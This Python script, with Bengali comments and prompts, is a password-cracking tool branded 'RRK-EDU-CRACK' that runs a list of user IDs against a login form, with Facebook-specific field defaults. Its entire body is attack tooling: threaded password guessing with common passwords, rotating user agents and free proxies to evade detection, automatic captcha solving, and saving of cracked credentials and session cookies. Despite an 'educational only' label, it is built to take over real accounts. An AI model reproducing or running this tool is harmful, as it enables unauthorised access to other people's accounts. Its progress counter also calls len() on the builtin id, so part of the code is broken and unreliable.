import requests
import sys
import random
import time
import os
import re
import json
import socket
from rich.console import Console
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from datetime import datetime

# কনসোল সেটআপ
console = Console()

# রঙের কোড
P = '\x1b[1;97m'  # সাদা
M = '\x1b[1;91m'  # লাল
H = '\x1b[1;92m'  # সবুজ
K = '\x1b[1;93m'  # হলুদ
B = '\x1b[1;94m'  # নীল

# গ্লোবাল ভ্যারিয়েবল
ok, cp, loop = 0, 0, 0
okc = f'OK-{datetime.now().strftime("%Y-%m-%d")}.txt'
cpc = f'CP-{datetime.now().strftime("%Y-%m-%d")}.txt'
error_log = f'ERROR-{datetime.now().strftime("%Y-%m-%d")}.json'
proxies = []
default_fields = {
    'facebook': {
        'username': 'email',
        'password': 'pass',
        'extra': ['lsd', 'jazoest', 'm_ts', 'li', '__user']
    }
}

# আধুনিক ইউজার-এজেন্ট তালিকা
ugen = [
    # Android - Chrome
    'Mozilla/5.0 (Linux; Android 14; SM-G998B Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; SM-A546E Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.58 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro Build/TQ3A.230901.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.81 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; SM-S928B Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-A536E Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.89 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 8 Build/UQ1A.231205.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.69 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-G981B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; SM-N986B Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.81 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 6a Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.89 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; SM-F936B Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.58 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-A326B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; SM-G990E Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.81 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 5 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.89 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; SM-A736B Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.69 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-G970F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Mobile Safari/537.36',

    # Android - Firefox
    'Mozilla/5.0 (Android 14; Mobile; rv:131.0) Gecko/131.0 Firefox/131.0',
    'Mozilla/5.0 (Android 13; Mobile; rv:130.0) Gecko/130.0 Firefox/130.0',
    'Mozilla/5.0 (Android 14; Mobile; rv:132.0) Gecko/132.0 Firefox/132.0',
    'Mozilla/5.0 (Android 13; Mobile; rv:129.0) Gecko/129.0 Firefox/129.0',
    'Mozilla/5.0 (Android 14; Tablet; rv:131.0) Gecko/131.0 Firefox/131.0',
    'Mozilla/5.0 (Android 13; Mobile; rv:131.0) Gecko/131.0 Firefox/131.0',
    'Mozilla/5.0 (Android 14; Mobile; rv:130.0) Gecko/130.0 Firefox/130.0',
    'Mozilla/5.0 (Android 13; Tablet; rv:131.0) Gecko/131.0 Firefox/131.0',
    'Mozilla/5.0 (Android 14; Mobile; rv:129.0) Gecko/129.0 Firefox/129.0',
    'Mozilla/5.0 (Android 13; Mobile; rv:132.0) Gecko/132.0 Firefox/132.0',

    # iOS - Safari
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5.1 Mobile/15E148 Safari/604.1',

    # iOS - Chrome
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/129.0.6668.81 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/129.0.6668.81 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.58 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/129.0.6668.89 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/129.0.6668.89 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/129.0.6668.100 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.69 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.58 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/129.0.6668.81 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/129.0.6668.89 Mobile/15E148 Safari/604.1',

    # Windows - Chrome
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.58 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.81 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.89 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.69 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.81 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.58 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.89 Safari/537.36',

    # Windows - Firefox
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:131.0) Gecko/20100101 Firefox/131.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0',

    # Windows - Edge
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Safari/537.36 Edg/129.0.2792.79',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.58 Safari/537.36 Edg/130.0.2849.68',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.81 Safari/537.36 Edg/129.0.2792.65',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.89 Safari/537.36 Edg/129.0.2792.79',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.69 Safari/537.36 Edg/130.0.2849.68',

    # macOS - Safari
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15',

    # macOS - Chrome
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.58 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.81 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.89 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.69 Safari/537.36',

    # Linux - Chrome
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.58 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.81 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.89 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.69 Safari/537.36',

    # Linux - Firefox
    'Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0',
    'Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0',
    'Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0',

    # Opera - Various Platforms
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Safari/537.36 OPR/115.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Safari/537.36 OPR/115.0.0.0',
    'Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Mobile Safari/537.36 OPR/82.0.4227.76310',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPiOS/45.0.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Safari/537.36 OPR/115.0.0.0'
]

# ফোল্ডার তৈরি
for folder in ['OK', 'CP', 'ERROR']:
    os.makedirs(folder, exist_ok=True)

# ইন্টারনেট সংযোগ চেক
def check_internet():
    try:
        socket.create_connection(("www.google.com", 80), timeout=5)
        return True
    except OSError:
        return False

# প্রক্সি টেস্ট
def test_proxy(proxy):
    try:
        ses = requests.Session()
        ses.proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
        ses.get('https://www.google.com', timeout=5)
        return True
    except:
        return False

# ফ্রি প্রক্সি ফেচ
def fetch_free_proxies():
    try:
        response = requests.get('https://free-proxy-list.net/', timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        proxies = []
        for row in soup.find('table').find_all('tr')[1:20]:
            cols = row.find_all('td')
            if cols:
                ip, port = cols[0].text, cols[1].text
                proxy = f'{ip}:{port}'
                if test_proxy(proxy):
                    proxies.append(proxy)
        return proxies
    except Exception as e:
        log_error(f'Proxy Fetch Error: {str(e)}')
        console.print(f'{M}ফ্রি প্রক্সি ফেচ করতে ব্যর্থ!{P}')
        return []

# ত্রুটি লগিং (JSON ফরম্যাট)
def log_error(message):
    error_data = {
        'timestamp': datetime.now().isoformat(),
        'error': message
    }
    try:
        with open(f'ERROR/{error_log}', 'a') as f:
            json.dump(error_data, f, ensure_ascii=False)
            f.write('\n')
    except:
        console.print(f'{M}ত্রুটি লগ করতে ব্যর্থ!{P}')

# ম্যাথ ক্যাপচা সমাধান
def solve_captcha(captcha_text):
    try:
        match = re.match(r'(\d+)\s*([+\-*])\s*(\d+)\s*=\s*\?', captcha_text)
        if not match:
            return None
        num1, operator, num2 = match.groups()
        num1, num2 = int(num1), int(num2)
        if operator == '+':
            return str(num1 + num2)
        elif operator == '-':
            return str(num1 - num2)
        elif operator == '*':
            return str(num1 * num2)
        return None
    except:
        return None

# ফর্ম পার্সিং
def parse_form(url, ses, platform='generic'):
    try:
        p = ses.get(url, timeout=15, verify=False)
        soup = BeautifulSoup(p.text, 'html.parser')
        form = soup.find('form', id='login_form') or soup.find('form')
        if not form:
            return None, None, None
        action = form.get('action') or url
        if action and not action.startswith('http'):
            action = urljoin(url, action)
        method = form.get('method', 'post').lower()
        inputs = form.find_all('input')
        fields = {}
        for inp in inputs:
            name = inp.get('name')
            value = inp.get('value', '')
            if name and 'submit' not in inp.get('type', '').lower():
                fields[name] = value
        if platform in default_fields:
            for field in default_fields[platform].get('extra', []):
                if field not in fields:
                    fields[field] = ''
        return action, method, fields
    except Exception as e:
        log_error(f'Form Parse Error: URL={url}, Error={str(e)}')
        return None, None, None

# ব্যানার
def banner():
    console.print(f'''{H}
    ██████╗ ██████╗ ██╗██╗   ██╗
    ██╔══██╗██╔══██╗██║██║   ██║
    ██████╔╝██████╔╝██║██║   ██║
    ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝
    ██║     ██║  ██║██║ ╚████╔╝ 
    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  
    [✓] DEVELOPER : ABUBOCKOR RIYAD [RR]
    [✓] TOOL      : RRK-EDU-CRACK
    [✓] TYPE      : EDUCATIONAL ONLY{P}
    ''')

# মূল ফাংশন
def main():
    global proxies
    os.system('clear')
    banner()
    console.print(f'{M}সতর্কতা: এই টুল শুধুমাত্র শিক্ষাগত উদ্দেশ্যে এবং আপনার নিজের টেস্টিং ওয়েবসাইটে ব্যবহার করুন। ফেসবুক বা অন্য প্ল্যাটফর্মে ব্যবহার অবৈধ।{P}')

    if not check_internet():
        console.print(f'{M}ইন্টারনেট সংযোগ নেই!{P}')
        sys.exit(1)

    console.print(f'{P}[1] Crack from File\n[2] Exit')
    choice = input('CHOOSE: ')
    if choice == '1':
        # ওয়েবসাইট কনফিগারেশন
        console.print(f'{P}লগইন পেজের URL (যেমন: http://your-test-site.com/login): ', end='')
        login_url = input().strip()
        platform = 'facebook' if 'facebook.com' in login_url else 'generic'
        console.print(f'{P}ইউজারনেম ফিল্ড [ডিফল্ট: {"email" if platform == "generic" else "email"}]: ', end='')
        username_field = input().strip() or ('email' if platform == 'generic' else 'email')
        console.print(f'{P}পাসওয়ার্ড ফিল্ড [ডিফল্ট: {"pass" if platform == "generic" else "pass"}]: ', end='')
        password_field = input().strip() or ('pass' if platform == 'generic' else 'pass')
        console.print(f'{P}ক্যাপচা ফিল্ড (যদি থাকে): ', end='')
        captcha_field = input().strip()
        console.print(f'{P}ক্যাপচা টাইপ (1=ম্যাথ, 2=ম্যানুয়াল, 0=নেই) [ডিফল্ট: 0]: ', end='')
        captcha_type = input().strip() or '0'
        console.print(f'{P}সফল লগইন মেসেজ [ডিফল্ট: Home]: ', end='')
        success_message = input().strip() or 'Home'

        # প্রক্সি সেটআপ
        console.print(f'{P}[1] Squid Proxy\n[2] Free Proxies\n[3] No Proxy')
        proxy_choice = input('CHOOSE PROXY: ')
        if proxy_choice == '1':
            proxies = ['127.0.0.1:3128']
            if not test_proxy(proxies[0]):
                console.print(f'{M}Squid Proxy কাজ করছে না! No Proxy ব্যবহার হবে।{P}')
                proxies = []
        elif proxy_choice == '2':
            console.print(f'{P}ফ্রি প্রক্সি ফেচ করা হচ্ছে...{P}')
            proxies = fetch_free_proxies()
            if not proxies:
                console.print(f'{M}কোনো কার্যকর প্রক্সি পাওয়া যায়নি! No Proxy ব্যবহার হবে।{P}')
        else:
            proxies = []
        file_crack(login_url, platform, username_field, password_field, captcha_field, captcha_type, success_message)
    elif choice == '2':
        console.print(f'{H}ধন্যবাদ টুল ব্যবহারের জন্য!{P}')
        sys.exit()
    else:
        console.print(f'{M}ভুল অপশন!{P}')
        time.sleep(2)
        main()

# ফাইল লোড
def file_crack(login_url, platform, username_field, password_field, captcha_field, captcha_type, success_message):
    console.print(f'{P}ফাইল পাথ (যেমন: /sdcard/ids.txt): ', end='')
    file_path = input().strip()
    try:
        ids = open(file_path, 'r').read().splitlines()
    except:
        console.print(f'{M}ফাইল পাওয়া যায়নি!{P}')
        time.sleep(2)
        file_crack(login_url, platform, username_field, password_field, captcha_field, captcha_type, success_message)
    console.print(f'{P}[+] TOTAL ID: {H}{len(ids)}{P}')
    setting(ids, login_url, platform, username_field, password_field, captcha_field, captcha_type, success_message)

# সেটিং
def setting(ids, login_url, platform, username_field, password_field, captcha_field, captcha_type, success_message):
    console.print(f'{P}পাসওয়ার্ড মোড (M=ম্যানুয়াল, D=ডিফল্ট): ', end='')
    mode = input().lower()
    pwx = []
    if mode == 'm':
        console.print(f'{P}পাসওয়ার্ড (কমা দিয়ে আলাদা, যেমন: test123,pass456): ', end='')
        pwx = input().strip().split(',')
    else:
        pwx = ['testpass', '123456', 'password']
    console.print(f'{H}ক্র্যাকিং শুরু হচ্ছে...{P}')
    with ThreadPoolExecutor(max_workers=30) as executor:
        for user in ids:
            try:
                uid, name = user.split('|')
                executor.submit(crack, uid, pwx, login_url, platform, username_field, password_field, captcha_field, captcha_type, success_message)
            except:
                console.print(f'{M}ফাইল ফরম্যাট ত্রুটি (আইডি|নাম)!{P}')
    console.print(f'\n{P}স্ক্যান সম্পন্ন\n{H}TOTAL OK: {ok}\n{M}TOTAL CP: {cp}{P}')

# ক্র্যাকিং
def crack(idf, pwv, login_url, platform, username_field, password_field, captcha_field, captcha_type, success_message):
    global ok, cp, loop, proxies
    sys.stdout.write(f"\r{B}RR_CRACK{P} [{K}{loop}{P}/{H}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{K}{cp}{P}]—[{K}{'{:.0%}'.format(loop / float(len(id)))}{P}]")
    sys.stdout.flush()
    ua = random.choice(ugen)
    ses = requests.Session()
    ses.headers.update({
        'user-agent': ua,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'referer': login_url
    })

    for pw in pwv:
        retries = 5
        use_proxy = bool(proxies)
        while retries > 0:
            try:
                if use_proxy and proxies:
                    nip = random.choice(proxies)
                    ses.proxies = {'http': f'http://{nip}', 'https': f'http://{nip}'}
                else:
                    ses.proxies = {}

                # ফর্ম পার্স
                action_url, method, fields = parse_form(login_url, ses, platform)
                if not action_url:
                    console.print(f'{M}ফর্ম পাওয়া যায়নি!{P}')
                    break

                # ফর্ম ডেটা
                data = fields.copy()
                data[username_field] = idf
                data[password_field] = pw
                captcha_answer = None
                captcha_text = None
                if captcha_field and captcha_type != '0':
                    soup = BeautifulSoup(ses.get(login_url, timeout=15, verify=False).text, 'html.parser')
                    captcha_label = soup.find('label', string=re.compile(r'CAPTCHA:', re.I))
                    if captcha_label:
                        captcha_text = captcha_label.text.replace('CAPTCHA:', '', 1).strip()
                        if captcha_type == '1':
                            captcha_answer = solve_captcha(captcha_text)
                            if not captcha_answer:
                                console.print(f'{M}ক্যাপচা সমাধান ব্যর্থ: {captcha_text}{P}')
                                break
                        elif captcha_type == '2':
                            console.print(f'{P}ক্যাপচা: {captcha_text}\nউত্তর: ', end='')
                            captcha_answer = input().strip()
                        data[captcha_field] = captcha_answer
                    else:
                        console.print(f'{M}ক্যাপচা প্রশ্ন পাওয়া যায়নি!{P}')
                        break

                # লগইন রিকোয়েস্ট
                po = ses.post(action_url, data=data, timeout=15, verify=False, allow_redirects=True)

                # ফলাফল চেক
                if success_message.lower() in po.text.lower() or 'home' in po.url.lower():
                    console.print(f'\n{H}[✓] STATUS: OK💚\n[✓] ID: {idf}\n[✓] Password: {pw}' +
                                  (f'\n[✓] CAPTCHA: {captcha_text} = {captcha_answer}' if captcha_answer else '') +
                                  f'\n[✓] Cookies: {ses.cookies.get_dict()}\n[✓] User-Agent: {ua}{P}')
                    with open(f'OK/{okc}', 'a') as f:
                        f.write(f'{idf}|{pw}|{captcha_answer or "N/A"}|{ua}\n')
                    ok += 1
                    break
                elif any(x in po.text.lower() for x in ['captcha', 'verification', 'checkpoint']):
                    console.print(f'{M}ক্যাপচা/চেকপয়েন্ট ট্রিগার: {captcha_text} = {captcha_answer}. পুনরায় চেষ্টা...{P}')
                    retries -= 1
                    time.sleep(random.uniform(2, 5))
                    continue
                else:
                    console.print(f'\n{M}[✓] STATUS: CP🥀\n[✓] ID: {idf}\n[✓] Password: {pw}' +
                                  (f'\n[✓] CAPTCHA: {captcha_text} = {captcha_answer}' if captcha_answer else '') +
                                  f'\n[✓] Cookies: {ses.cookies.get_dict()}\n[✓] User-Agent: {ua}{P}')
                    with open(f'CP/{cpc}', 'a') as f:
                        f.write(f'{idf}|{pw}|{captcha_answer or "N/A"}\n')
                    cp += 1
                    break
            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.ProxyError) as e:
                retries -= 1
                if retries == 0:
                    log_error(f'Request Error: ID={idf}, PW={pw}, Proxy={nip if use_proxy else "None"}, Error={str(e)}')
                    console.print(f'{M}ত্রুটি: {str(e)}. পরবর্তী পাসওয়ার্ড চেষ্টা করা হচ্ছে...{P}')
                    break
                if isinstance(e, requests.exceptions.ProxyError) and use_proxy:
                    console.print(f'{M}প্রক্সি ব্যর্থ ({nip}), No Proxy মোডে সুইচ...{P}')
                    use_proxy = False
                    ses.proxies = {}
                console.print(f'{M}কানেকশন ত্রুটি, {retries} বার পুনরায় চেষ্টা...{P}')
                time.sleep(random.uniform(2, 5))
            except Exception as e:
                log_error(f'Unknown Error: ID={idf}, PW={pw}, Proxy={nip if use_proxy else "None"}, Error={str(e)}')
                console.print(f'{M}অজানা ত্রুটি: {str(e)}.{P}')
                break
    loop += 1

if __name__ == '__main__':
    try:
        main()
    except ImportError as e:
        console.print(f'{M}লাইব্রেরি ত্রুটি: {str(e)}. `pip install requests beautifulsoup4 rich` চালান।{P}')
        sys.exit(1)
    except KeyboardInterrupt:
        console.print(f'{M}প্রোগ্রাম বন্ধ করা হয়েছে।{P}')
        sys.exit(0)